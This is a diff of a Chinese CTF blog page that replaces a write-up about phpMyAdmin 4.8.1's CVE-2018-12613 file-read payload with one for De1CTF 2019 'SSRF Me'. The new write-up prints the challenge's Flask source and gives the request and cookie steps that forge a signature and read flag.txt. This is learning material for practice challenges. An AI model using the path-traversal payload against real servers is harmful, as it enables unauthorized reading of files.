@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>BUU每日一题037 - lll-nnnのblog</title>
+  <title>BUU每日一题038 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUU每日一题037">
+            <span class="h2" id="subtitle" title="BUU每日一题038">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-02-25 13:55" pubdate>
-        2021年2月25日 下午
+      <time datetime="2021-02-26 14:20" pubdate>
+        2021年2月26日 下午
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      70 字
+      586 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      10
        分钟
     </span>
   
@@ -224,13 +224,129 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BUU每日一题037</h1>
+            <h1 style="display: none">BUU每日一题038</h1>
             
             <div class="markdown-body">
-              <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[GWCTF 2019]我有一个数据库<img src="https://ftp.bmp.ovh/imgs/2021/02/8714abd7c1fa4046.png" srcset="/img/loading.gif">         </p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>目录扫描到<code>phpmyadmin</code>(为什么我的就扫不到？御剑，dirsearch,dirb都扫不到？？？？？)<br>然后是phpmyadmin4.81的一个远程文件读取漏洞      </p>
-<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code><br>得到flag   </p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43872099/article/details/104128639">CVE-2018-12613</a></p>
+              <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[De1CTF 2019]SSRF Me<br>hint：<code>flag is in ./flag.txt</code>         </p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><div class="hljs"><pre><code>#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding(&#39;latin1&#39;)
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+
+class Task:
+    def __init__(self, action, param, sign, ip):         ##函数--各个定义
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):         ##函数
+        result = &#123;&#125;
+        result[&#39;code&#39;] = 500
+        if (self.checkSign()):
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
+                resp = scan(self.param)      ##扫描目录
+                if (resp == &quot;Connection Timeout&quot;):
+                    result[&#39;data&#39;] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result[&#39;code&#39;] = 200
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
+                result[&#39;code&#39;] = 200
+                result[&#39;data&#39;] = f.read()       ##读取
+            if result[&#39;code&#39;] == 500:
+                result[&#39;data&#39;] = &quot;Action Error&quot;
+        else:
+            result[&#39;code&#39;] = 500
+            result[&#39;msg&#39;] = &quot;Sign Error&quot;
+        return result
+
+    def checkSign(self):          ##检查
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+
+#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])                 ##路由1----&gt;对传参加密
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+
+
+@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])              ##路由2------&gt;执行
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route(&#39;/&#39;)        ##路由3----&gt;首页
+def index():
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;
+
+
+
+def getSign(action, param):        ##加密函数
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+        return True
+    else:
+        return False
+
+
+if __name__ == &#39;__main__&#39;:
+    app.debug = False
+    app.run(host=&#39;0.0.0.0&#39;)         </code></pre></div>
+<p>利用点：     </p>
+<div class="hljs"><pre><code>result[&#39;data&#39;] = f.read()        </code></pre></div>
+<p>前提是action里有read和scan,还要通过检查<br>可以通过路由1获得加密后的sign<br><code>geneSign()</code>里<code>action=&quot;scan&quot;</code>所以我们要在param里加上read<br>获得sign后<br>在路由2里修改cookie传参即可        </p>
+<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：</p>
+<div class="hljs"><pre><code>/geneSign?param=flag.txtread       </code></pre></div>
+<p>得到sign:<code>411d8c10d1b90c5c4e39c1904652f8c0</code>       </p>
+<div class="hljs"><pre><code>/De1ta?param=flag.txt      
+cookie: action=readscan;sign=411d8c10d1b90c5c4e39c1904652f8c0        </code></pre></div>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>flask代码审计<br>虽然看了看flask的基本知识，但看到一大段代码时总抓不到重点，还要多看看     </p>
 
             </div>
             <hr>
@@ -254,9 +370,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/02/26/BUU038/">
+                      <a href="/2021/02/27/BUU039/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU每日一题038</span>
+                        <span class="hidden-mobile">BUU每日一题039</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -264,8 +380,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/02/24/hgameweek3/">
-                        <span class="hidden-mobile">Hgameweek3</span>
+                      <a href="/2021/02/25/BUU037/">
+                        <span class="hidden-mobile">BUU每日一题037</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
